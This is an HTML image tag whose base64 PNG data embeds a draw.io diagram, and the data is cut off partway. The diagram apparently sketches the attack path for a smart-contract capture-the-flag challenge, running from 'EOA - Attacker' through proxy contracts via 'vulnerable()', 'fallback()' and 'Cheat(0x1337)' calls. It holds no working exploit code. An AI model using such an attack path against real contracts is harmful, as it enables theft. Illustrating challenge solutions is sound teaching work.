&lt;p&gt;&lt;img src=&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAAcMAAAD3CAYAAABhGj&#x2F;RAAAAAXNSR0IArs4c6QAAOOl0RVh0bXhmaWxlACUzQ214ZmlsZSUyMGhvc3QlM0QlMjJFbGVjdHJvbiUyMiUyMG1vZGlmaWVkJTNEJTIyMjAyNC0wNC0xNlQwMyUzQTQ3JTNBMTguNzU0WiUyMiUyMGFnZW50JTNEJTIyTW96aWxsYSUyRjUuMCUyMChXaW5kb3dzJTIwTlQlMjAxMC4wJTNCJTIwV2luNjQlM0IlMjB4NjQpJTIwQXBwbGVXZWJLaXQlMkY1MzcuMzYlMjAoS0hUTUwlMkMlMjBsaWtlJTIwR2Vja28pJTIwZHJhdy5pbyUyRjIxLjYuMSUyMENocm9tZSUyRjExMi4wLjU2MTUuMjA0JTIwRWxlY3Ryb24lMkYyNC42LjElMjBTYWZhcmklMkY1MzcuMzYlMjIlMjBldGFnJTNEJTIyWlRmZjRiRDZ6MHVLVGl5ZkItek0lMjIlMjB2ZXJzaW9uJTNEJTIyMjEuNi4xJTIyJTIwdHlwZSUzRCUyMmRldmljZSUyMiUzRSUwQSUyMCUyMCUzQ2RpYWdyYW0lMjBuYW1lJTNEJTIyJUU3JUFDJUFDJTIwMSUyMCVFOSVBMSVCNSUyMiUyMGlkJTNEJTIyUmZSQkxDZkNaTjBnMjkyc1hBZDUlMjIlM0UlMEElMjAlMjAlMjAlMjAlM0NteEdyYXBoTW9kZWwlMjBkeCUzRCUyMjk1MiUyMiUyMGR5JTNEJTIyNjU0JTIyJTIwZ3JpZCUzRCUyMjElMjIlMjBncmlkU2l6ZSUzRCUyMjEwJTIyJTIwZ3VpZGVzJTNEJTIyMSUyMiUyMHRvb2x0aXBzJTNEJTIyMSUyMiUyMGNvbm5lY3QlM0QlMjIxJTIyJTIwYXJyb3dzJTNEJTIyMSUyMiUyMGZvbGQlM0QlMjIxJTIyJTIwcGFnZSUzRCUyMjElMjIlMjBwYWdlU2NhbGUlM0QlMjIxJTIyJTIwcGFnZVdpZHRoJTNEJTIyODI3JTIyJTIwcGFnZUhlaWdodCUzRCUyMjExNjklMjIlMjBtYXRoJTNEJTIyMCUyMiUyMHNoYWRvdyUzRCUyMjAlMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlM0Nyb290JTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhDZWxsJTIwaWQlM0QlMjIwJTIyJTIwJTJGJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhDZWxsJTIwaWQlM0QlMjIxJTIyJTIwcGFyZW50JTNEJTIyMCUyMiUyMCUyRiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMTAlMjIlMjB2YWx1ZSUzRCUyMiUyMiUyMHN0eWxlJTNEJTIyZWRnZVN0eWxlJTNEb3J0aG9nb25hbEVkZ2VTdHlsZSUzQnJvdW5kZWQlM0QwJTNCb3J0aG9nb25hbExvb3AlM0QxJTNCamV0dHlTaXplJTNEYXV0byUzQmh0bWwlM0QxJTNCbGFiZWxCYWNrZ3JvdW5kQ29sb3IlM0Rub25lJTNCc3Ryb2tlQ29sb3IlM0QlMjM3ODhBQTMlM0Jmb250Q29sb3IlM0RkZWZhdWx0JTNCJTIyJTIwcGFyZW50JTNEJTIyMSUyMiUyMHNvdXJjZSUzRCUyMkdMUm4zaXNqNGR5SVZKY0VqT000LTIlMjIlMjB0YXJnZXQlM0QlMjJHTFJuM2lzajRkeUlWSmNFak9NNC05JTIyJTIwZWRnZSUzRCUyMjElMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteEdlb21ldHJ5JTIwcmVsYXRpdmUlM0QlMjIxJTIyJTIwYXMlM0QlMjJnZW9tZXRyeSUyMiUyMCUyRiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14Q2VsbCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMTMlMjIlMjB2YWx1ZSUzRCUyMiUyNmx0JTNCZm9udCUyMHN0eWxlJTNEJTI2cXVvdCUzQmZvbnQtc2l6ZSUzQSUyMDEycHglM0IlMjZxdW90JTNCJTI2Z3QlM0J2dWxuZXJhYmxlKCklMjZsdCUzQiUyRmZvbnQlMjZndCUzQiUyMiUyMHN0eWxlJTNEJTIyZWRnZUxhYmVsJTNCaHRtbCUzRDElM0JhbGlnbiUzRGNlbnRlciUzQnZlcnRpY2FsQWxpZ24lM0RtaWRkbGUlM0JyZXNpemFibGUlM0QwJTNCcG9pbnRzJTNEJTVCJTVEJTNCbGFiZWxCYWNrZ3JvdW5kQ29sb3IlM0Rub25lJTNCZm9udENvbG9yJTNEJTIzNDY0OTVEJTNCJTIyJTIwcGFyZW50JTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMTAlMjIlMjB2ZXJ0ZXglM0QlMjIxJTIyJTIwY29ubmVjdGFibGUlM0QlMjIwJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhHZW9tZXRyeSUyMHglM0QlMjIwLjY5MDklMjIlMjByZWxhdGl2ZSUzRCUyMjElMjIlMjBhcyUzRCUyMmdlb21ldHJ5JTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhQb2ludCUyMGFzJTNEJTIyb2Zmc2V0JTIyJTIwJTJGJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGbXhHZW9tZXRyeSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14Q2VsbCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMjklMjIlMjBzdHlsZSUzRCUyMmVkZ2VTdHlsZSUzRG9ydGhvZ29uYWxFZGdlU3R5bGUlM0Jyb3VuZGVkJTNEMCUzQm9ydGhvZ29uYWxMb29wJTNEMSUzQmpldHR5U2l6ZSUzRGF1dG8lM0JodG1sJTNEMSUzQmV4aXRYJTNEMC41JTNCZXhpdFklM0QwJTNCZXhpdER4JTNEMCUzQmV4aXREeSUzRDAlM0JsYWJlbEJhY2tncm91bmRDb2xvciUzRG5vbmUlM0JzdHJva2VDb2xvciUzRCUyMzc4OEFBMyUzQmZvbnRDb2xvciUzRGRlZmF1bHQlM0IlMjIlMjBwYXJlbnQlM0QlMjIxJTIyJTIwc291cmNlJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMiUyMiUyMGVkZ2UlM0QlMjIxJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhHZW9tZXRyeSUyMHJlbGF0aXZlJTNEJTIyMSUyMiUyMGFzJTNEJTIyZ2VvbWV0cnklMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteFBvaW50JTIweCUzRCUyMjI2MCUyMiUyMHklM0QlMjI0MzAlMjIlMjBhcyUzRCUyMnRhcmdldFBvaW50JTIyJTIwJTJGJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGbXhHZW9tZXRyeSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14Q2VsbCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMzAlMjIlMjB2YWx1ZSUzRCUyMiUyNmx0JTNCZm9udCUyMHN0eWxlJTNEJTI2cXVvdCUzQmZvbnQtc2l6ZSUzQSUyMDEycHglM0IlMjZxdW90JTNCJTI2Z3QlM0JTdGVwXzIoKSUyNmx0JTNCJTJGZm9udCUyNmd0JTNCJTIyJTIwc3R5bGUlM0QlMjJlZGdlTGFiZWwlM0JodG1sJTNEMSUzQmFsaWduJTNEY2VudGVyJTNCdmVydGljYWxBbGlnbiUzRG1pZGRsZSUzQnJlc2l6YWJsZSUzRDAlM0Jwb2ludHMlM0QlNUIlNUQlM0JsYWJlbEJhY2tncm91bmRDb2xvciUzRG5vbmUlM0Jmb250Q29sb3IlM0QlMjM0NjQ5NUQlM0IlMjIlMjBwYXJlbnQlM0QlMjJHTFJuM2lzajRkeUlWSmNFak9NNC0yOSUyMiUyMHZlcnRleCUzRCUyMjElMjIlMjBjb25uZWN0YWJsZSUzRCUyMjAlMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteEdlb21ldHJ5JTIweCUzRCUyMi0wLjA2NjclMjIlMjB5JTNEJTIyLTElMjIlMjByZWxhdGl2ZSUzRCUyMjElMjIlMjBhcyUzRCUyMmdlb21ldHJ5JTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhQb2ludCUyMGFzJTNEJTIyb2Zmc2V0JTIyJTIwJTJGJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGbXhHZW9tZXRyeSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14Q2VsbCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMiUyMiUyMHZhbHVlJTNEJTIyRU9BJTIwLSUyMEF0dGFja2VyJTIyJTIwc3R5bGUlM0QlMjJyb3VuZGVkJTNEMCUzQndoaXRlU3BhY2UlM0R3cmFwJTNCaHRtbCUzRDElM0JsYWJlbEJhY2tncm91bmRDb2xvciUzRG5vbmUlM0JmaWxsQ29sb3IlM0QlMjNCMkM5QUIlM0JzdHJva2VDb2xvciUzRCUyMzc4OEFBMyUzQmZvbnRDb2xvciUzRCUyMzQ2NDk1RCUzQiUyMiUyMHBhcmVudCUzRCUyMjElMjIlMjB2ZXJ0ZXglM0QlMjIxJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhHZW9tZXRyeSUyMHglM0QlMjIyMDAlMjIlMjB5JTNEJTIyNDYwJTIyJTIwd2lkdGglM0QlMjIxMjAlMjIlMjBoZWlnaHQlM0QlMjI2MCUyMiUyMGFzJTNEJTIyZ2VvbWV0cnklMjIlMjAlMkYlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZteENlbGwlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteENlbGwlMjBpZCUzRCUyMkdMUm4zaXNqNGR5SVZKY0VqT000LTE5JTIyJTIwdmFsdWUlM0QlMjIlMjIlMjBzdHlsZSUzRCUyMmVkZ2VTdHlsZSUzRG9ydGhvZ29uYWxFZGdlU3R5bGUlM0Jyb3VuZGVkJTNEMCUzQm9ydGhvZ29uYWxMb29wJTNEMSUzQmpldHR5U2l6ZSUzRGF1dG8lM0JodG1sJTNEMSUzQmxhYmVsQmFja2dyb3VuZENvbG9yJTNEbm9uZSUzQnN0cm9rZUNvbG9yJTNEJTIzNzg4QUEzJTNCZm9udENvbG9yJTNEZGVmYXVsdCUzQiUyMiUyMHBhcmVudCUzRCUyMjElMjIlMjBzb3VyY2UlM0QlMjJHTFJuM2lzajRkeUlWSmNFak9NNC03JTIyJTIwdGFyZ2V0JTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMTQlMjIlMjBlZGdlJTNEJTIyMSUyMiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214R2VvbWV0cnklMjByZWxhdGl2ZSUzRCUyMjElMjIlMjBhcyUzRCUyMmdlb21ldHJ5JTIyJTIwJTJGJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGbXhDZWxsJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhDZWxsJTIwaWQlM0QlMjJHTFJuM2lzajRkeUlWSmNFak9NNC0yMCUyMiUyMHZhbHVlJTNEJTIyJTI2bHQlM0Jmb250JTIwc3R5bGUlM0QlMjZxdW90JTNCZm9udC1zaXplJTNBJTIwMTJweCUzQiUyNnF1b3QlM0IlMjZndCUzQmZhbGxiYWNrKCklMjZsdCUzQiUyRmZvbnQlMjZndCUzQiUyMiUyMHN0eWxlJTNEJTIyZWRnZUxhYmVsJTNCaHRtbCUzRDElM0JhbGlnbiUzRGNlbnRlciUzQnZlcnRpY2FsQWxpZ24lM0RtaWRkbGUlM0JyZXNpemFibGUlM0QwJTNCcG9pbnRzJTNEJTVCJTVEJTNCbGFiZWxCYWNrZ3JvdW5kQ29sb3IlM0Rub25lJTNCZm9udENvbG9yJTNEJTIzNDY0OTVEJTNCJTIyJTIwcGFyZW50JTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMTklMjIlMjB2ZXJ0ZXglM0QlMjIxJTIyJTIwY29ubmVjdGFibGUlM0QlMjIwJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhHZW9tZXRyeSUyMHglM0QlMjItMC4xJTIyJTIweSUzRCUyMi0xJTIyJTIwcmVsYXRpdmUlM0QlMjIxJTIyJTIwYXMlM0QlMjJnZW9tZXRyeSUyMiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214UG9pbnQlMjBhcyUzRCUyMm9mZnNldCUyMiUyMCUyRiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14R2VvbWV0cnklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZteENlbGwlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteENlbGwlMjBpZCUzRCUyMkdMUm4zaXNqNGR5SVZKY0VqT000LTclMjIlMjB2YWx1ZSUzRCUyMiUyNmx0JTNCZm9udCUyMHN0eWxlJTNEJTI2cXVvdCUzQmZvbnQtc2l6ZSUzQSUyMDEzcHglM0IlMjZxdW90JTNCJTI2Z3QlM0Jwcm94eTIlMjAtJTIwMzJieXRlcyUyNmx0JTNCJTJGZm9udCUyNmd0JTNCJTIyJTIwc3R5bGUlM0QlMjJlbGxpcHNlJTNCd2hpdGVTcGFjZSUzRHdyYXAlM0JodG1sJTNEMSUzQmFsaWduJTNEY2VudGVyJTNCZGFzaGVkJTNEMSUzQmxhYmVsQmFja2dyb3VuZENvbG9yJTNEbm9uZSUzQmZpbGxDb2xvciUzRCUyM0IyQzlBQiUzQnN0cm9rZUNvbG9yJTNEJTIzNzg4QUEzJTNCZm9udENvbG9yJTNEJTIzNDY0OTVEJTNCJTIyJTIwcGFyZW50JTNEJTIyMSUyMiUyMHZlcnRleCUzRCUyMjElMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteEdlb21ldHJ5JTIweCUzRCUyMjUzMCUyMiUyMHklM0QlMjIzMDAlMjIlMjB3aWR0aCUzRCUyMjEyMCUyMiUyMGhlaWdodCUzRCUyMjUwJTIyJTIwYXMlM0QlMjJnZW9tZXRyeSUyMiUyMCUyRiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14Q2VsbCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtOCUyMiUyMHZhbHVlJTNEJTIyJTI2bHQlM0JzcGFuJTIwc3R5bGUlM0QlMjZxdW90JTNCYm9yZGVyLWJvdHRvbSUzQSUyMDFweCUyMGRvdHRlZCUyNnF1b3QlM0IlMjZndCUzQiUyNmx0JTNCZm9udCUyMHN0eWxlJTNEJTI2cXVvdCUzQmZvbnQtc2l6ZSUzQSUyMDEzcHglM0IlMjZxdW90JTNCJTI2Z3QlM0JtYWluJTI2bHQlM0IlMkZmb250JTI2Z3QlM0IlMjZsdCUzQiUyRnNwYW4lMjZndCUzQiUyMiUyMHN0eWxlJTNEJTIyZWxsaXBzZSUzQndoaXRlU3BhY2UlM0R3cmFwJTNCaHRtbCUzRDElM0JhbGlnbiUzRGNlbnRlciUzQmxhYmVsQmFja2dyb3VuZENvbG9yJTNEbm9uZSUzQmZpbGxDb2xvciUzRCUyM0IyQzlBQiUzQnN0cm9rZUNvbG9yJTNEJTIzNzg4QUEzJTNCZm9udENvbG9yJTNEJTIzNDY0OTVEJTNCJTIyJTIwcGFyZW50JTNEJTIyMSUyMiUyMHZlcnRleCUzRCUyMjElMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteEdlb21ldHJ5JTIweCUzRCUyMjIwMCUyMiUyMHklM0QlMjIzODAlMjIlMjB3aWR0aCUzRCUyMjEyMCUyMiUyMGhlaWdodCUzRCUyMjUwJTIyJTIwYXMlM0QlMjJnZW9tZXRyeSUyMiUyMCUyRiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14Q2VsbCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtOSUyMiUyMHZhbHVlJTNEJTIyQ2hhbGxlbmdlJTIyJTIwc3R5bGUlM0QlMjJlbGxpcHNlJTNCd2hpdGVTcGFjZSUzRHdyYXAlM0JodG1sJTNEMSUzQmFsaWduJTNEY2VudGVyJTNCbGFiZWxCYWNrZ3JvdW5kQ29sb3IlM0Rub25lJTNCZmlsbENvbG9yJTNEJTIzQjJDOUFCJTNCc3Ryb2tlQ29sb3IlM0QlMjM3ODhBQTMlM0Jmb250Q29sb3IlM0QlMjM0NjQ5NUQlM0IlMjIlMjBwYXJlbnQlM0QlMjIxJTIyJTIwdmVydGV4JTNEJTIyMSUyMiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214R2VvbWV0cnklMjB4JTNEJTIyMjAwJTIyJTIweSUzRCUyMjMwMCUyMiUyMHdpZHRoJTNEJTIyMTIwJTIyJTIwaGVpZ2h0JTNEJTIyNTAlMjIlMjBhcyUzRCUyMmdlb21ldHJ5JTIyJTIwJTJGJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGbXhDZWxsJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhDZWxsJTIwaWQlM0QlMjJHTFJuM2lzajRkeUlWSmNFak9NNC0xMSUyMiUyMHZhbHVlJTNEJTIyJTI2bHQlM0JzcGFuJTIwc3R5bGUlM0QlMjZxdW90JTNCYm9yZGVyLWJvdHRvbSUzQSUyMDFweCUyMGRvdHRlZCUyNnF1b3QlM0IlMjZndCUzQnByb3h5MSUyMC0lMjA4Ynl0ZXMlMjZsdCUzQmJyJTI2Z3QlM0IlMjZsdCUzQiUyRnNwYW4lMjZndCUzQiUyMiUyMHN0eWxlJTNEJTIyZWxsaXBzZSUzQndoaXRlU3BhY2UlM0R3cmFwJTNCaHRtbCUzRDElM0JhbGlnbiUzRGNlbnRlciUzQmxhYmVsQmFja2dyb3VuZENvbG9yJTNEbm9uZSUzQmZpbGxDb2xvciUzRCUyM0IyQzlBQiUzQnN0cm9rZUNvbG9yJTNEJTIzNzg4QUEzJTNCZm9udENvbG9yJTNEJTIzNDY0OTVEJTNCJTIyJTIwcGFyZW50JTNEJTIyMSUyMiUyMHZlcnRleCUzRCUyMjElMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteEdlb21ldHJ5JTIweCUzRCUyMjM3MCUyMiUyMHklM0QlMjIzMDAlMjIlMjB3aWR0aCUzRCUyMjEyMCUyMiUyMGhlaWdodCUzRCUyMjUwJTIyJTIwYXMlM0QlMjJnZW9tZXRyeSUyMiUyMCUyRiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14Q2VsbCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMTQlMjIlMjB2YWx1ZSUzRCUyMiUyNmx0JTNCc3BhbiUyMHN0eWxlJTNEJTI2cXVvdCUzQmJvcmRlci1ib3R0b20lM0ElMjAxcHglMjBkb3R0ZWQlMjZxdW90JTNCJTI2Z3QlM0IlMjZsdCUzQmZvbnQlMjBzdHlsZSUzRCUyNnF1b3QlM0Jmb250LXNpemUlM0ElMjAxM3B4JTNCJTI2cXVvdCUzQiUyNmd0JTNCY29udHJhY3RBJTI2bHQlM0IlMkZmb250JTI2Z3QlM0IlMjZsdCUzQiUyRnNwYW4lMjZndCUzQiUyMiUyMHN0eWxlJTNEJTIyZWxsaXBzZSUzQndoaXRlU3BhY2UlM0R3cmFwJTNCaHRtbCUzRDElM0JhbGlnbiUzRGNlbnRlciUzQmxhYmVsQmFja2dyb3VuZENvbG9yJTNEbm9uZSUzQmZpbGxDb2xvciUzRCUyM0IyQzlBQiUzQnN0cm9rZUNvbG9yJTNEJTIzNzg4QUEzJTNCZm9udENvbG9yJTNEJTIzNDY0OTVEJTNCJTIyJTIwcGFyZW50JTNEJTIyMSUyMiUyMHZlcnRleCUzRCUyMjElMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteEdlb21ldHJ5JTIweCUzRCUyMjUzMCUyMiUyMHklM0QlMjI0NjAlMjIlMjB3aWR0aCUzRCUyMjEyMCUyMiUyMGhlaWdodCUzRCUyMjUwJTIyJTIwYXMlM0QlMjJnZW9tZXRyeSUyMiUyMCUyRiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14Q2VsbCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMjElMjIlMjB2YWx1ZSUzRCUyMiUyMiUyMHN0eWxlJTNEJTIyZW5kQXJyb3clM0RjbGFzc2ljJTNCaHRtbCUzRDElM0Jyb3VuZGVkJTNEMCUzQmV4aXRYJTNEMCUzQmV4aXRZJTNEMC41JTNCZXhpdER4JTNEMCUzQmV4aXREeSUzRDAlM0JlbnRyeVglM0QxJTNCZW50cnlZJTNEMSUzQmVudHJ5RHglM0QwJTNCZW50cnlEeSUzRDAlM0JsYWJlbEJhY2tncm91bmRDb2xvciUzRG5vbmUlM0JzdHJva2VDb2xvciUzRCUyMzc4OEFBMyUzQmZvbnRDb2xvciUzRGRlZmF1bHQlM0IlMjIlMjBwYXJlbnQlM0QlMjIxJTIyJTIwc291cmNlJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMTQlMjIlMjB0YXJnZXQlM0QlMjJHTFJuM2lzajRkeUlWSmNFak9NNC05JTIyJTIwZWRnZSUzRCUyMjElMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteEdlb21ldHJ5JTIwd2lkdGglM0QlMjI1MCUyMiUyMGhlaWdodCUzRCUyMjUwJTIyJTIwcmVsYXRpdmUlM0QlMjIxJTIyJTIwYXMlM0QlMjJnZW9tZXRyeSUyMiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214UG9pbnQlMjB4JTNEJTIyMzkwJTIyJTIweSUzRCUyMjM2MCUyMiUyMGFzJTNEJTIyc291cmNlUG9pbnQlMjIlMjAlMkYlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteFBvaW50JTIweCUzRCUyMjQ0MCUyMiUyMHklM0QlMjIzMTAlMjIlMjBhcyUzRCUyMnRhcmdldFBvaW50JTIyJTIwJTJGJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDJTJGbXhHZW9tZXRyeSUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14Q2VsbCUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214Q2VsbCUyMGlkJTNEJTIyR0xSbjNpc2o0ZHlJVkpjRWpPTTQtMjIlMjIlMjB2YWx1ZSUzRCUyMiUyNmx0JTNCZm9udCUyMHN0eWxlJTNEJTI2cXVvdCUzQmZvbnQtc2l6ZSUzQSUyMDEycHglM0IlMjZxdW90JTNCJTI2Z3QlM0JDaGVhdCgweDEzMzcpJTI2bHQlM0IlMkZmb250JTI2Z3QlM0IlMjIlMjBzdHlsZSUzRCUyMmVkZ2VMYWJlbCUzQmh0bWwlM0QxJTNCYWxpZ24lM0RjZW50ZXIlM0J2ZXJ0aWNhbEFsaWduJTNEbWlkZGxlJTNCcmVzaXphYmxlJTNEMCUzQnBvaW50cyUzRCU1QiU1RCUzQmxhYmVsQmFja2dyb3VuZENvbG9yJTNEbm9uZSUzQmZvbnRDb2xvciUzRCUyMzQ2NDk1RCUzQiUyMiUyMHBhcmVudCUzRCUyMkdMUm4zaXNqNGR5SVZKY0VqT000LTIxJTIyJTIwdmVydGV4JTNEJTIyMSUyMiUyMGNvbm5lY3RhYmxlJTNEJTIyMCUyMiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214R2VvbWV0cnklMjB4JTNEJTIyLTAuMDA4MSUyMiUyMHklM0QlMjIzJTIyJTIwcmVsYXRpdmUlM0QlMjIxJTIyJTIwYXMlM0QlMjJnZW9tZXRyeSUyMiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ214UG9pbnQlMjBhcyUzRCUyMm9mZnNldCUyMiUyMCUyRiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQyUyRm14R2VvbWV0cnklM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0MlMkZteENlbGwlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteENlbGwlMjBpZCUzRCUyMkdMUm4zaXNqNGR5SVZKY0VqT000LTIzJTIyJTIwdmFsdWUlM0QlMjIlMjIlMjBzdHlsZSUzRCUyMmN1cnZlZCUzRDElM0JlbmRBcnJvdyUzRGNsYXNzaWMlM0JodG1sJTNEMSUzQnJvdW5kZWQlM0QwJTNCZXhpdFglM0QwLjY1OCUzQmV4aXRZJTNEMC4wNCUzQmV4aXREeCUzRDAlM0JleGl0RHklM0QwJTNCZXhpdFBlcmltZXRlciUzRDAlM0JlbnRyeVglM0QwLjMzMyUzQmVudHJ5WSUzRDAuMDQlM0JlbnRyeUR4JTNEMCUzQmVudHJ5RHklM0QwJTNCZW50cnlQZXJpbWV0ZXIlM0QwJTNCbGFiZWxCYWNrZ3JvdW5kQ29sb3IlM0Rub25lJTNCc3Ryb2tlQ29sb3IlM0QlMjM3ODhBQTMlM0Jmb250Q29sb3IlM0RkZWZhdWx0JTNCJTIyJTIwcGFyZW50JTNEJTIyMSUyMiUyMHNvdXJjZSUzRCUyMkdMUm4zaXNqNGR5SVZKY0VqT000LTklMjIlMjB0YXJnZXQlM0QlMjJHTFJuM2lzajRkeUlWSmNFak9NNC0xMSUyMiUyMGVkZ2UlM0QlMjIxJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhHZW9tZXRyeSUyMHdpZHRoJTNEJTIyNTAlMjIlMjBoZWlnaHQlM0QlMjI1MCUyMiUyMHJlbGF0aXZlJTNEJTIyMSUyMiUyMGFzJTNEJTIyZ2VvbWV0cnklMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteFBvaW50JTIweCUzRCUyMjM5MCUyMiUyMHklM0QlMjIzNjAlMjIlMjBhcyUzRCUyMnNvdXJjZVBvaW50JTIyJTIwJTJGJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDbXhQb2ludCUyMHglM0QlMjI0NDAlMjIlMjB5JTNEJTIyMzEwJTIyJTIwYXMlM0QlMjJ0YXJnZXRQb2ludCUyMiUyMCUyRiUzRSUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUzQ0FycmF5JTIwYXMlM0QlMjJwb2ludHMlMjIlM0UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM0NteFBvaW50JTIweCUzRCUyMjMxMCUyMiUyMHklM0QlMjIyODA